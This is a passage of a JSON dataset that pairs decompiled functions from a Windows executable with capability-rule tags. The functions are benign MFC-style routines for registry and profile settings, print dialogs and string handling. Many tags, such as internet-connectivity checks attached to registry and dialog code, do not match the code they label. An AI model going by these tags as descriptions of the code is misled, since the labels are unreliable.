        "decompiled_code": "\nvoid __cdecl fcn.0043b3d8(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t in_ECX;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = arg_ch;\n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    if (arg_ch != 0) goto code_r0x0043b3ed;\n    while( true ) {\n        fcn.00411e42();\ncode_r0x0043b3ed:\n        var_4h = arg_14h;\n        var_8h = uVar2;\n        fcn.0043ac75(arg_8h, 1, &var_8h);\n        if (arg_10h == 0) break;\n        fcn.0043a077(&arg_ch);\n        uVar3 = (*_sym.imp.OLEAUT32.dll_SafeArrayGetUBound)(*(in_ECX + 8));\n        iVar1 = uVar3 * uVar2;\n        uVar3 = iVar1;\n        if ((iVar1 >> 0x20 == 0) && (uVar3 < 0x80000000)) {\n            fcn.0041314e(arg_ch, uVar3, arg_10h, uVar3);\n            fcn.0043a08d();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 355
    },
    "0043c0a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pbstr\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043c0a1(uint arg_8h, uint pbstrOut, uint dwFlags)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    ulong *extraout_ECX;\n    int32_t unaff_EBP;\n    uint pbstr;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = 0;\n    if (*(extraout_ECX + 1) == 2) {\n        fcn.00413f9d(0x4939a0);\n    }\n    else if (*(extraout_ECX + 1) == 1) {\n        uVar2 = fcn.0042407a();\n        fcn.0040f840(uVar2);\n        *(unaff_EBP + -4) = 0;\n        iVar3 = fcn.0040f670(0xd800);\n        if (iVar3 == 0) {\n            fcn.00413f9d(\"Invalid DateTime\");\n        }\n        else {\n            fcn.0041d1b4(unaff_EBP + 0xc);\n        }\n        fcn.00402740();\n    }\n    else {\n        *(unaff_EBP + -0x10) = 0;\n        uVar1 = *extraout_ECX;\n        *(unaff_EBP + -4) = 1;\n        iVar3 = (*_sym.imp.OLEAUT32.dll_VarBstrFromDisp)\n                          (uVar1, *(unaff_EBP + 0x10), *(unaff_EBP + 0xc), unaff_EBP + -0x10);\n        if (iVar3 < 0) {\n            uVar2 = fcn.0042407a();\n            fcn.0040f840(uVar2);\n            *(unaff_EBP + -4) = 2;\n            iVar3 = fcn.0040f670(0xd800);\n            if (iVar3 == 0) {\n                fcn.00413f9d(\"Invalid DateTime\");\n            }\n            else {\n                fcn.0041d1b4(unaff_EBP + 0xc);\n            }\n        }\n        else {\n            fcn.00413a89(*(unaff_EBP + -0x10));\n            *(unaff_EBP + -4) = 3;\n            fcn.0041d1b4(unaff_EBP + 0x10);\n        }\n        fcn.00402740();\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(*(unaff_EBP + -0x10));\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 622
    },
    "0043c666": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043c666(uint lpAppName, uint lpValueName, int32_t nDefault)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_ECX + 0x54) == 0) {\n        nDefault = (*_sym.imp.KERNEL32.dll_GetPrivateProfileIntA)(lpAppName, lpValueName, nDefault, *(in_ECX + 0x68));\n    }\n    else {\n        var_4h = in_ECX;\n        iVar1 = fcn.0043c620(lpAppName);\n        if (iVar1 != 0) {\n            lpAppName = 4;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(iVar1, lpValueName, 0, &var_8h, &var_4h, &lpAppName);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n            if (iVar2 == 0) {\n                return var_4h;\n            }\n        }\n    }\n    return nDefault;\n}\n",
        "token_count": 260
    },
    "0043c6cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c6cf(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint lpString;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    if (*(in_ECX + 0x54) == 0) {\n        fcn.004634fc(&lpString, 0x10, 0x492f50, arg_10h);\n        (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(arg_8h, arg_ch, &lpString, *(in_ECX + 0x68));\n    }\n    else {\n        iVar1 = fcn.0043c620(arg_8h);\n        if (iVar1 != 0) {\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, arg_ch, 0, 4, &arg_10h, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        }\n    }\n    fcn.0045e747(unaff_EBX);\n    return;\n}\n",
        "token_count": 273
    },
    "0043c756": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043c756(uint lpAppName, int32_t lpValueName, int32_t lpString)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x54) == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringA)(lpAppName, lpValueName, lpString, *(in_ECX + 0x68));\n        return uVar3;\n    }\n    if (lpValueName == 0) {\n        iVar1 = fcn.0043c58f();\n        if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(iVar1, lpAppName);\n            goto code_r0x0043c7c2;\n        }\n    }\n    else {\n        iVar1 = fcn.0043c620(lpAppName);\n        if (lpString == 0) {\n            if (iVar1 != 0) {\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueA)(iVar1, lpValueName);\ncode_r0x0043c7c2:\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n                return iVar2 == 0;\n            }\n        }\n        else if (iVar1 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(iVar1, lpValueName, 0, 1, lpString, iVar2 + 1);\n            goto code_r0x0043c7c2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 396
    },
    "0043c7ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043c7ec(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x54) == 0) {\n        iVar2 = fcn.00411579(arg_14h * 2 + 1);\n        uVar1 = 0;\n        if (arg_14h != 0) {\n            do {\n                *(iVar2 + uVar1 * 2) = (*(arg_10h + uVar1) & 0xf) + 0x41;\n                *(iVar2 + 1 + uVar1 * 2) = (*(arg_10h + uVar1) >> 4) + 0x41;\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < arg_14h);\n        }\n        *(iVar2 + uVar1 * 2) = 0;\n        uVar1 = fcn.0043c756(arg_8h, arg_ch, iVar2);\n        fcn.004115a4(iVar2);\n    }\n    else {\n        uVar1 = fcn.0043c620(arg_8h);\n        if (uVar1 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uVar1, arg_ch, 0, 3, arg_10h, arg_14h);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uVar1);\n            uVar1 = iVar2 == 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 388
    },
    "0043cb77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043cb77(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = arg_8h;\n    iVar4 = fcn.00433033(arg_8h, 0xffffffff);\n    if (iVar4 == 0) {\n        fcn.00411e42();\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n    iVar5 = fcn.0044c347(arg_8h, 0, 0);\n    iVar5 = iVar5 + -1;\n    pcVar1 = arg_8h + (iVar4 - iVar5);\n    if (arg_ch < iVar4) {\n        if (arg_ch < iVar5) {\n            if (arg_10h == 0) {\n                *arg_8h = '\\0';\n                return;\n            }\n        }\n        else {\n            pcVar6 = arg_8h + 2;\n            if ((*arg_8h == '\\\\') && (arg_8h[1] == '\\\\')) {\n                for (; *pcVar6 != '\\\\'; pcVar6 = fcn.00464bbe(pcVar6)) {\n                }\n            }\n            arg_8h = pcVar6;\n            if (3 < iVar4 - iVar5) {\n                do {\n                    arg_8h = fcn.00464bbe(arg_8h);\n                } while (*arg_8h != '\\\\');\n            }\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n            iVar8 = arg_8h - pcVar3;\n            if (iVar8 + 5 + iVar5 <= arg_ch) {\n                while (iVar5 = (*pcVar2)(arg_8h),  arg_ch < iVar5 + 4 + iVar8) {\n                    do {\n                        arg_8h = fcn.00464bbe(arg_8h);\n                    } while (*arg_8h != '\\\\');\n                }\n                if ((iVar8 < 0) || (arg_ch <= iVar8)) {\n                    iVar8 = arg_ch;\n                }\n                uVar7 = fcn.0045f3a0(pcVar3 + iVar8, 5, \"\\\\...\", 5);\n                fcn.00401000(uVar7);\n                fcn.00422ff8(pcVar3, iVar4, arg_8h);\n                return;\n            }\n        }\n        fcn.00424fd8(pcVar3, iVar4, pcVar1);\n    }\n    return;\n}\n",
        "token_count": 622
    },
    "0043d48f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043d48f(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    if (arg_8h == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(arg_8h);\n    uVar2 = fcn.004185ec(uVar2);\n    piVar3 = fcn.0042f550(0x4983d0, uVar2);\n    if (piVar3 != NULL) {\n        if (arg_ch == 0x400) {\n            uVar2 = (**(*piVar3 + 0x15c))(arg_10h, arg_10h >> 0x10, arg_14h);\n            return uVar2;\n        }\n        if ((0x400 < arg_ch) && (arg_ch < 0x407)) {\n            iVar1 = *piVar3;\n            uVar2 = fcn.0042e163(arg_10h, arg_ch, arg_14h);\n            uVar2 = (**(iVar1 + 0x160))(uVar2);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 299
    },
    "0043d553": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0043d553(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint16_t *puVar3;\n    int32_t iVar4;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (param_1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        iVar4 = param_1;\n        puVar3 = (*_sym.imp.KERNEL32.dll_GlobalLock)(param_1);\n        if (param_1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*pcVar1)(param_1);\n        }\n        if (puVar3 == NULL) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = (*_sym.imp.GDI32.dll_CreateDCA)(*puVar3 + puVar3, puVar3[1] + puVar3, puVar3[2] + puVar3, uVar2);\n            pcVar1 = _sym.imp.KERNEL32.dll_GlobalUnlock;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar4);\n            if (param_1 != 0) {\n                (*pcVar1)(param_1);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 292
    },
    "0043d6db": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0043d6db(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004121cd(0, *(unaff_EBP + 0x10));\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CPrintDialog.0;\n    extraout_ECX[0x1d] = extraout_ECX + 0x1e;\n    fcn.00462290(extraout_ECX + 0x1e, 0, 0x42);\n    *extraout_ECX[0x1d] = 0x42;\n    *(extraout_ECX[0x1d] + 0x14) = *(unaff_EBP + 0xc) | 0x3000;\n    iVar2 = fcn.0041256b();\n    if (iVar2 != 0) {\n        *(extraout_ECX[0x1d] + 0x14) = *(extraout_ECX[0x1d] + 0x14) | 0x800;\n    }\n    iVar2 = *(unaff_EBP + 8);\n    *(extraout_ECX[0x1d] + 0x2a) = fcn.0044c5c4;\n    *(extraout_ECX[0x1d] + 0x2e) = fcn.0044c5c4;\n    if (iVar2 == 0) {\n        extraout_ECX[0x15] = 0x7008;\n        puVar1 = extraout_ECX[0x1d] + 0x14;\n        *puVar1 = *puVar1 | 0x100;\n    }\n    else {\n        extraout_ECX[0x15] = 0x7009;\n        puVar1 = extraout_ECX[0x1d] + 0x14;\n        *puVar1 = *puVar1 | 0x40;\n    }\n    *(extraout_ECX[0x1d] + 0x14) = *(extraout_ECX[0x1d] + 0x14) & 0xfffffdff;\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 609
    },
    "0043d831": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043d831(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) == 0) {\n        uVar1 = fcn.004182f8(\"PrintDlgA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x48) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x48);\n    return;\n}\n",
        "token_count": 125
    },
    "0043d8d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0043d8d0(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "0043d906": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043d906(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x54) == 0) {\n        uVar1 = fcn.004182f8(\"PageSetupDlgA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x54) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x54);\n    return;\n}\n",
        "token_count": 126
    },
    "0043d9a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0043d9a5(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "0043dbde": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0043dbde(uint phkResult, uint lpString, int32_t lpValueName)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    if (lpValueName == 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueA)(0x80000000, phkResult, 1, lpString, uVar1);\n        bVar4 = iVar2 == 0;\n    }\n    else {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(0x80000000, phkResult, &phkResult);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(phkResult, lpValueName, 0, 1, lpString, iVar2 + 1);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            if ((iVar3 == 0) && (iVar2 == 0)) {\n                return true;\n            }\n        }\n        bVar4 = false;\n    }\n    return bVar4;\n}\n",
        "token_count": 305
    },
    "0043df37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043df37(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *(param_1 + 8);\n    iVar3 = 0;\n    var_4h = param_1;\n    while (var_8h != 0) {\n        ppiVar2 = fcn.00416670(&var_8h);\n        piVar1 = *ppiVar2;\n        var_4h = (**(*piVar1 + 0x54))();\n        while (var_4h != 0) {\n            (**(*piVar1 + 0x58))(&var_4h);\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 204
    },
    "0043e219": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0043e219(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    iVar4 = 0xc;\n    fcn.004627af(0xc);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *extraout_ECX = vtable.CDocManager.0;\n    pcVar1 = extraout_ECX[2];\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = pcVar1;\n    while (pcVar1 != NULL) {\n        *(unaff_EBP + -0x14) = pcVar1;\n        iVar4 = unaff_EBP + -0x10;\n        ppiVar3 = fcn.00416670();\n        piVar2 = *ppiVar3;\n        if (piVar2[8] != 0) {\n            fcn.004330e2(*(unaff_EBP + -0x14));\n            (**(*piVar2 + 4))(1);\n        }\n        pcVar1 = *(unaff_EBP + -0x10);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00433188(iVar4);\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 352
    },
    "0043f95c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f95c(char *lpString1, uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint unaff_EDI;\n    uint var_624h;\n    uint var_620h;\n    uint var_61ch;\n    uint var_414h;\n    uint var_20ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(lpString1, lpString2);\n    if ((iVar2 == 0) &&\n       (iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a),  pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA,  iVar2 != 0)) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString1);\n        iVar3 = (*pcVar1)(lpString2);\n        if (iVar2 == iVar3) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n            pcVar1 = _sym.imp.KERNEL32.dll_GetStringTypeExA;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeExA)(uVar4, 1, lpString1, 0xffffffff, &var_61ch);\n            (*pcVar1)(uVar4, 4, lpString1, 0xffffffff, &var_20ch);\n            (*pcVar1)(uVar4, 1, lpString2, 0xffffffff, &var_414h);\n            if (*lpString1 != '\\0') {\n                iVar2 = 0;\n                do {\n                    if (((*(&var_20ch + iVar2) & 0x80) != 0) && (*(&var_61ch + iVar2) != *(&var_414h + iVar2))) break;\n                    iVar2 = iVar2 + 2;\n                    lpString1 = fcn.00464bbe(lpString1);\n                } while (*lpString1 != '\\0');\n            }\n        }\n    }\n    fcn.0045e747(unaff_EDI);\n    return;\n}\n",
        "token_count": 498
    },
    "00440741": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00440741(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00462290(&var_14h, 0, 0x14);\n    var_4h = 0;\n    var_10h = arg_ch;\n    if (arg_10h == 0) {\n        var_14h = 0;\n    }\n    else {\n        var_14h = *(in_ECX + 0x60);\n    }\n    if (*(in_ECX + 0x5c) == 0) {\n        piVar1 = NULL;\n    }\n    else {\n        piVar1 = fcn.0042f4a6();\n        if (piVar1 != NULL) {\n            iVar2 = (**(*piVar1 + 0x138))(*(in_ECX + 0x44), 0x44000000, arg_8h, &var_14h);\n            piVar1 = -(iVar2 != 0) & piVar1;\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 292
    },
    "00440bfd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00440bfd(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_24h;\n    \n    if (arg_8h == NULL) {\n        fcn.00401280(0x80004005);\n        in_ECX = extraout_ECX;\n    }\n    iVar1 = fcn.004650ae(&var_24h, in_ECX);\n    if (iVar1 == 0) {\n        puVar2 = &var_24h;\n        puVar3 = arg_8h;\n        for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    else {\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 234
    },
    "00440e46": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00440e46(uint arg_8h, int32_t lpFileTime)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack36;\n    uint lpSystemTime;\n    uint var_12h;\n    ushort var_eh;\n    ushort var_ch;\n    uint var_ah;\n    \n    if (lpFileTime == 0) {\n        iStack36 = 0x4b62b8;\n        fcn.0046230a(&stack0xffffffdc, 0x4a76e8);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iStack36 = 0x440e62;\n    lpSystemTime._0_2_ = fcn.00440c43();\n    iStack36 = 0x440e6d;\n    lpSystemTime._2_2_ = fcn.00440c63();\n    iStack36 = 0x440e78;\n    var_12h._0_2_ = fcn.00440c7f();\n    iStack36 = 0x440e83;\n    var_12h._2_2_ = fcn.00440c9a();\n    iStack36 = 0x440e8e;\n    var_eh = fcn.00440cb6();\n    iStack36 = 0x440e99;\n    var_ch = fcn.00440cd2();\n    var_ah._0_2_ = 0;\n    iStack36 = &fcn.00440e46::var_ah + 2;\n    iVar2 = (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&fcn.00440e46::lpSystemTime);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(0);\n        fcn.00441745(uVar3);\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalFileTimeToFileTime)(&fcn.00440e46::var_ah + 2, lpFileTime);\n    if (iVar2 == 0) {\n        uVar3 = (*pcVar1)(0);\n        fcn.00441745(uVar3);\n    }\n    return;\n}\n",
        "token_count": 532
    },
    "00441745": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
